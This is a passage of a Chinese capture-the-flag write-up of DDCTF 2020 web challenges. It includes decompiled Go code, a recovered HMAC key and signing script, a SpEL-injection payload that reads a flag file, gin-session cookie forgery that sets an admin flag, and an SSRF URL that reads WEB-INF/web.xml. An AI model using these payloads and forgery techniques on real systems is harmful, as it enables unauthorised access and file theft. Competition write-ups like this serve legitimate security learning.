class="hljs-number">0LL</span>;<br>  v81 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">if</span> ( &amp;v53 == (__int64 (__fastcall ***)(__int64, __int64))<span class="hljs-number">-280LL</span> )<br>    LODWORD(v76) = v55.m256i_i32[<span class="hljs-number">4</span>];<br>  *(_QWORD *)&amp;v69 = <span class="hljs-number">3LL</span>;<br>  *((_QWORD *)&amp;v69 + <span class="hljs-number">1</span>) = <span class="hljs-number">3LL</span>;<br>  v68 = &amp;v76;<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))&amp;unk_6A1040;<br>  v54 = (<span class="hljs-type">unsigned</span> __int64)&amp;v65;<br>  runtime_convT2E(a1, a2, v34, v55.m256i_i64[<span class="hljs-number">1</span>], v35);<br>  v38 = v55.m256i_i64[<span class="hljs-number">1</span>];<br>  v39 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v40 = (__int64)v68;<br>  v61 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  *v68 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v62 = v38;<br>  <span class="hljs-keyword">if</span> ( byte_963800 )<br>  &#123;<br>    v53 = (__int64 (__fastcall **)(__int64, __int64))(v40 + <span class="hljs-number">8</span>);<br>    *(_QWORD *)&amp;v54 = v38;<br>    runtime_writebarrierptr(a1, a2);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_QWORD *)(v40 + <span class="hljs-number">8</span>) = v38;<br>  &#125;<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))&amp;unk_6A1040;<br>  v54 = (<span class="hljs-type">unsigned</span> __int64)&amp;v63;<br>  runtime_convT2E(a1, a2, v36, v39, v37);<br>  v43 = v55.m256i_i64[<span class="hljs-number">1</span>];<br>  v44 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v45 = (__int64)(v68 + <span class="hljs-number">2</span>);<br>  v61 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v68[<span class="hljs-number">2</span>] = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v62 = v43;<br>  <span class="hljs-keyword">if</span> ( byte_963800 )<br>  &#123;<br>    v53 = (__int64 (__fastcall **)(__int64, __int64))(v45 + <span class="hljs-number">8</span>);<br>    *(_QWORD *)&amp;v54 = v43;<br>    runtime_writebarrierptr(a1, a2);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_QWORD *)(v45 + <span class="hljs-number">8</span>) = v43;<br>  &#125;<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))&amp;unk_69EDC0;<br>  v54 = (<span class="hljs-type">unsigned</span> __int64)&amp;v56;<br>  runtime_convT2E(a1, a2, v41, v44, v42);<br>  v49 = v55.m256i_i64[<span class="hljs-number">1</span>];<br>  v50 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v51 = (__int64)(v68 + <span class="hljs-number">4</span>);<br>  v61 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v68[<span class="hljs-number">4</span>] = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v62 = v49;<br>  <span class="hljs-keyword">if</span> ( byte_963800 )<br>  &#123;<br>    v53 = (__int64 (__fastcall **)(__int64, __int64))(v51 + <span class="hljs-number">8</span>);<br>    *(_QWORD *)&amp;v54 = v49;<br>    runtime_writebarrierptr(a1, a2);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_QWORD *)(v51 + <span class="hljs-number">8</span>) = v49;<br>  &#125;<br>  *(_QWORD *)&amp;v54 = <span class="hljs-number">41LL</span>;<br>  *((_QWORD *)&amp;v54 + <span class="hljs-number">1</span>) = v68;<br>  *(_OWORD *)v55.m256i_i8 = v69;<br>  <span class="hljs-keyword">return</span> log_Printf(a1, a2, v46, v50, v47, v48, (__int64)<span class="hljs-string">&quot;[+]get sign:%s, command:%s, time_stamp:%d&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>可以看到有一个很显眼的DDCTFWithYou，还有就是这个</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">crypto_hmac_New(a1, a2, v26, v55.m256i_i64[<span class="hljs-number">1</span>], v27, v28);<br></code></pre></td></tr></table></figure>
+
+
+
+<p>crypto_hmac_New这个一出来应该很多人都明白是啥了，先初步猜测这是我们的HmacSHA256（奇怪的是FindCrypt没识别出来），而这个DDCTFWithYou十有八九就是我们的秘钥</p>
+<p>刚好题目还给了我们签名的格式，我们试验一下<br>得到的sign值为jI6DSECGAyzSs5t5wljIxgp8aBN4SmgzagxSvsv&#x2F;y3w&#x3D;，这是经过base64encode的，我们将其解码：<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200908180920946.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>然后明文加密后（记得引号）：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200908181050475.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>一样的，至此我们的工作结束，贴原WP的脚本：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;bytes&quot;</span><br>    <span class="hljs-string">&quot;io/ioutil&quot;</span><br>    <span class="hljs-string">&quot;net/http&quot;</span><br><br>    <span class="hljs-string">&quot;crypto/hmac&quot;</span><br>    <span class="hljs-string">&quot;crypto/sha256&quot;</span><br>    <span class="hljs-string">&quot;encoding/base64&quot;</span><br>    <span class="hljs-string">&quot;encoding/json&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br><br>    <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Param <span class="hljs-keyword">struct</span> &#123;<br>    Command   <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;command&quot;`</span><br>    Signature <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;signature&quot;`</span><br>    Timestamp <span class="hljs-type">int64</span>  <span class="hljs-string">`json:&quot;timestamp&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    r := gin.Default()<br><br>    r.POST(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>        command := c.DefaultPostForm(<span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;DDCTF&quot;</span>)<br>        key := <span class="hljs-string">&quot;DDCTFWithYou&quot;</span><br><br>        timestamp := time.Now().Unix()<br>        plain := fmt.Sprintf(<span class="hljs-string">&quot;%s|%d&quot;</span>, command, timestamp)<br>        mac := hmac.New(sha256.New, []<span class="hljs-type">byte</span>(key))<br>        mac.Write([]<span class="hljs-type">byte</span>(plain))<br><br>        param := <span class="hljs-built_in">new</span>(Param)<br>        param.Command = command<br>        param.Signature = base64.StdEncoding.EncodeToString(mac.Sum(<span class="hljs-literal">nil</span>))<br>        param.Timestamp = timestamp<br>        js, _ := json.Marshal(param)<br><br>        url := <span class="hljs-string">&quot;http://117.51.136.197/server/command&quot;</span><br>        resp, err := http.Post(url, <span class="hljs-string">&quot;application/json&quot;</span>, bytes.NewBuffer(js))<br>        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>            <span class="hljs-built_in">panic</span>(err)<br>        &#125;<br>        <span class="hljs-keyword">defer</span> resp.Body.Close()<br>        body, _ := ioutil.ReadAll(resp.Body)<br>        c.String(http.StatusOK, <span class="hljs-type">string</span>(body))<br>    &#125;)<br><br>    r.Run(<span class="hljs-string">&quot;:2333&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>至此，第二关完成。 接下来是最后一关。</p>
+<p>最后一关是需要寻找可用payload，是spel注入，也算是SSTI的一种。</p>
+<p>参考：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/poing/p/12837175.html">https://www.cnblogs.com/poing/p/12837175.html</a><br><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://www.mi1k7ea.com/2020/01/10/SpEL表达式注入漏洞总结/</a></p>
+<p>原WP师傅的脚本是另外起了一个端口用来测试命令，我那个找不到的脚本command是直接嵌到代码里了。这个好像更方便一些</p>
+<p>贴原WP的Payload，当时好像测过这个payload但好像失败了。。不知道咋回事，然后就卡在这一步了</p>
+<p>new java.util.Scanner(new java.io.File(‘&#x2F;home&#x2F;dc2-user&#x2F;flag&#x2F;flag.txt’)).next()<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907164201411.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="图片来自原WP"><br>于是可以直接读flag（xmsl）</p>
+<h1 id="卡片商店"><a href="#卡片商店" class="headerlink" title="卡片商店"></a>卡片商店</h1><p>这题比赛结束后5分钟做出来了。。好气啊</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907164612727.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这题一开始以为是条件竞争漏洞，然后写了脚本测了半天，无果。</p>
+<p>然后测试发现有整数溢出漏洞（这个也算是购物相关的网站中比较常出现的一个漏洞了，可惜当时一根筋测条件竞争去了，要不还能快点给后面留时间）</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907164952446.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>执行结果：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/2020090716504424.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>再换掉账面上借的卡片后可以买礼物（这里注意整个过程手速要快，有时间限制）<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907165432462.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这个seckey一般就是secretkey，好不好这题刚好有个session：<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907165524734.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>于是我们可以考虑这个seckey就是用来生成session的。</p>
+<p>回过头来，直接访问flag，我们会得到信息<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907165636943.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>合理推测我们需要伪造session来通过验证拿flag<br>之前由于出现过Go了，我们考虑gin-session（没get到杜松子酒是gin，跑偏整到Flask那边去了）<br>参考：<a target="_blank" rel="noopener" href="https://www.tizi365.com/archives/288.html">https://www.tizi365.com/archives/288.html</a></p>
+<p>现在问题是我们需要伪造哪个字段呢？gin的session我做题时没找到太好的还原方法（原WP最后师傅贴了还原的方法），只能base64解密看看了。一番尝试后得到：<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907172822262.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这个方法肯定是有问题的，但也能看出一些信息。这个session的方式应该是 timestamp|Go的encode数据|校验（也可能是签名啥的） 这样的方式，我们也可以看到一个bool类型的admin字段，我们的目标就是它。</p>
+<p>贴过来代码：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>        <span class="hljs-comment">// 导入session包</span><br>	<span class="hljs-string">&quot;github.com/gin-contrib/sessions&quot;</span><br>       <span class="hljs-comment">// 导入session存储引擎</span><br>	<span class="hljs-string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span><br>        <span class="hljs-comment">// 导入gin框架包</span><br>	<span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	r := gin.Default()<br>        <span class="hljs-comment">// 创建基于cookie的存储引擎，secret11111 参数是用于加密的密钥，这里填入我们的seckey</span><br>	store := cookie.NewStore([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;secret11111&quot;</span>))<br>        <span class="hljs-comment">// 设置session中间件，参数mysession，指的是session的名字，也是cookie的名字</span><br>       <span class="hljs-comment">// store是前面创建的存储引擎，我们可以替换成其他存储引擎</span><br>	r.Use(sessions.Sessions(<span class="hljs-string">&quot;mysession&quot;</span>, store))<br><br>	r.GET(<span class="hljs-string">&quot;/hello&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>                <span class="hljs-comment">// 初始化session对象</span><br>		session := sessions.Default(c)<br>                <br>                <span class="hljs-comment">// 通过session.Get读取session值</span><br>                <span class="hljs-comment">// session是键值对格式数据，因此需要通过key查询数据</span><br>		<span class="hljs-keyword">if</span> session.Get(<span class="hljs-string">&quot;hello&quot;</span>) != <span class="hljs-string">&quot;world&quot;</span> &#123;<br>                        <span class="hljs-comment">// 设置session数据</span><br>			session.Set(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>)<br>                        <span class="hljs-comment">// 删除session数据</span><br>                        <span class="hljs-comment">//session.Delete(&quot;tizi365&quot;)</span><br>                        <span class="hljs-comment">// 保存session数据</span><br>			session.Save()<br>                        <span class="hljs-comment">// 删除整个session</span><br>                        <span class="hljs-comment">// session.Clear()</span><br>		&#125;<br>                <br>		c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<span class="hljs-string">&quot;hello&quot;</span>: session.Get(<span class="hljs-string">&quot;hello&quot;</span>)&#125;)<br>	&#125;)<br>	r.Run(<span class="hljs-string">&quot;:8000&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+<p>稍作改动即可</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> session.Get(<span class="hljs-string">&quot;hello&quot;</span>) != <span class="hljs-string">&quot;world&quot;</span> &#123;<br>                        <span class="hljs-comment">// 设置session数据</span><br>			session.Set(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>)<br>                        <span class="hljs-comment">// 删除session数据</span><br>                        <span class="hljs-comment">//session.Delete(&quot;tizi365&quot;)</span><br>                        <span class="hljs-comment">// 保存session数据</span><br>			session.Save()<br>                        <span class="hljs-comment">// 删除整个session</span><br>                        <span class="hljs-comment">// session.Clear()</span><br>		&#125;<br><br>改成<br><br><span class="hljs-keyword">if</span> session.Get(<span class="hljs-string">&quot;admin&quot;</span>) != <span class="hljs-literal">true</span> &#123;<br>            session.Set(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-literal">true</span>)<br>            session.Save()<br>        &#125;<br><br>即可（记得放你得到的签名）<br></code></pre></td></tr></table></figure>
+
+
+
+
+<p>这里是测试过后发现这样就行的，原本还在后面那块和timestamp那纠结了好久。。后来发现并不需要</p>
+<p>拿到session</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907175340702.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>替换后拿flag</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907175411821.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h1 id="Easy-Web"><a href="#Easy-Web" class="headerlink" title="Easy Web"></a>Easy Web</h1><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907193452165.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>考的这个：CVE-2020-11989<br>这个CVE前几天还看过，差点没反应过来。。<br>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7964">https://xz.aliyun.com/t/7964</a></p>
+<p>但访问</p>
+<p><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/index.php">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/index.php</a></p>
+<p>就行（但后面还是要用这个CVE绕进admin界面）</p>
+<p>进入界面，这个莫名其妙的图片实在是太显眼了，本能地察觉有问题<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907193407253.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>SSRF，然后用fuzzDict中的字典跑了一下，可以读到WEB-INF&#x2F;web.xml：</p>
+<p><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/web.xml">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/web.xml</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">web-app</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.0&quot;</span> <span class="hljs-attr">metadata-complete</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Archetype Created Web Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">context-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span><br>      classpath:spring-core.xml<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">context-param</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.springframework.web.util.WebAppRootListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.springframework.web.util.IntrospectorCleanupListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>springmvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:spring-web.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>springmvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>encodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>encoding<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>forceEncoding<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>encodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span 